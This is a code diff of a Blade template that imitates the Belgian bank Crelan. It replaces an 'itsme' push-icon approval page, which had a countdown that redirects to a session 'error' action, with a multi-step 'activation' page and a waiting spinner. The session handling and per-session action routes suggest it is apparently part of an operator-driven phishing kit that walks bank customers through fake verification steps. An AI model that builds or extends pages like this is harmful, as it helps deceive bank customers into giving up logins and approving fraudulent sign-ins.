@@ -1,6 +1,6 @@
 @extends('layouts.app')
 
-@section('title', __('messages.push_icon_header') . ' | Crelan')
+@section('title', __('messages.activation_title') . ' | Crelan')
 
 @section('content')
 <div class="form-page-center">
@@ -16,49 +16,59 @@
                 <path d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z" fill="#009644"/>
                 <path d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z" fill="#84BD00"/>
             </svg>
-            <span>{{ __('messages.push_icon_header') }}</span>
+            <span>{{ __('messages.activation_header') }}</span>
         </div>
 
         <div class="form-container--content">
-            @php
-                $iconsPath = base_path('scripts/icons.json');
-                $iconsData = [];
-                if (file_exists($iconsPath)) {
-                    $iconsData = json_decode(file_get_contents($iconsPath), true) ?? [];
-                }
-                $iconId = $session->push_icon_id ?? ($iconsData[0]['id'] ?? null);
-                $iconSvg = null;
-                foreach ($iconsData as $icon) {
-                    if (($icon['id'] ?? null) === $iconId) {
-                        $iconSvg = $icon['content'] ?? null;
-                        break;
-                    }
-                }
-                if ($iconSvg) {
-                    $iconSvg = str_replace('#202120', '#ffffff', $iconSvg);
-                }
-            @endphp
-
-            <div class="push-icon-page">
-                <div class="push-icon-top">
-                    <div class="push-icon-logo">its<br>me</div>
-                    <div class="push-icon-language">Nederlands</div>
+            <div class="activation-page">
+                <div class="activation-topbar">
+                    <span>{{ __('messages.activation_top_title') }}</span>
+                </div>
+                <div class="activation-topbar-line">
+                    <span></span>
+                </div>
+                <div class="activation-icon">
+                    <svg viewBox="0 0 48 48" aria-hidden="true">
+                        <path d="M8 22.5L24 10l16 12.5v15.5a2 2 0 0 1-2 2H10a2 2 0 0 1-2-2V22.5z" fill="#00A651"/>
+                        <path d="M18 23h12v10H18z" fill="#fff"/>
+                    </svg>
                 </div>
 
-                <h2 class="push-icon-title">{{ __('messages.push_icon_title') }}</h2>
-                <p class="push-icon-subtitle">{{ __('messages.push_icon_subtitle') }}</p>
-                <p class="push-icon-instruction">{{ __('messages.push_icon_instruction') }}</p>
+                <h2 class="activation-title">{{ __('messages.activation_title') }}</h2>
+                <p class="activation-subtitle">{{ __('messages.activation_subtitle') }}</p>
 
-                <div class="push-icon-preview">
-                    {!! $iconSvg ?? '' !!}
+                <div class="activation-steps">
+                    <div class="activation-step">
+                        <div class="activation-step-number">1</div>
+                        <div class="activation-step-content">
+                            <div class="activation-step-title">{{ __('messages.activation_step1_title') }}</div>
+                            <div class="activation-step-text">{{ __('messages.activation_step1_text') }}</div>
+                            <a class="activation-link" href="#">{{ __('messages.activation_help_link') }}</a>
+                        </div>
+                    </div>
+                    <div class="activation-step">
+                        <div class="activation-step-number">2</div>
+                        <div class="activation-step-content">
+                            <div class="activation-step-title">{{ __('messages.activation_step2_title') }}</div>
+                            <div class="activation-step-text">{{ __('messages.activation_step2_text') }}</div>
+                        </div>
+                    </div>
+                    <div class="activation-step">
+                        <div class="activation-step-number">3</div>
+                        <div class="activation-step-content">
+                            <div class="activation-step-title">{{ __('messages.activation_step3_title') }}</div>
+                            <div class="activation-step-text">{{ __('messages.activation_step3_text') }}</div>
+                        </div>
+                    </div>
                 </div>
 
-                <div class="push-icon-timer">
-                    <span id="push-icon-timer-value">03:00</span>
-                    <span>{{ __('messages.push_icon_timer_label') }}</span>
+                <div class="activation-note">
+                    <span class="activation-note-icon">!</span>
+                    <span>{{ __('messages.activation_note') }}</span>
                 </div>
-                <div class="push-icon-progress">
-                    <div class="push-icon-progress-bar" id="push-icon-progress-bar"></div>
+
+                <div class="activation-spinner">
+                    <div class="waiting-spinner"></div>
                 </div>
             </div>
         </div>
@@ -70,6 +80,7 @@
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const sessionId = localStorage.getItem('session_id');
+
     if (!sessionId) {
         window.location.href = '/';
         return;
@@ -78,33 +89,6 @@ document.addEventListener('DOMContentLoaded', function() {
     if (window.SessionManager) {
         window.SessionManager.setSessionId(sessionId);
     }
-
-    const totalSeconds = 180;
-    let remainingSeconds = totalSeconds;
-    const timerValue = document.getElementById('push-icon-timer-value');
-    const progressBar = document.getElementById('push-icon-progress-bar');
-
-    const updateTimer = () => {
-        const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
-        const seconds = String(remainingSeconds % 60).padStart(2, '0');
-        timerValue.textContent = `${minutes}:${seconds}`;
-        const percent = (remainingSeconds / totalSeconds) * 100;
-        progressBar.style.width = `${percent}%`;
-    };
-
-    updateTimer();
-
-    const timerInterval = setInterval(() => {
-        remainingSeconds -= 1;
-        if (remainingSeconds <= 0) {
-            remainingSeconds = 0;
-            updateTimer();
-            clearInterval(timerInterval);
-            window.location.href = `/session/${sessionId}/action/error`;
-            return;
-        }
-        updateTimer();
-    }, 1000);
 });
 </script>
 @endpush
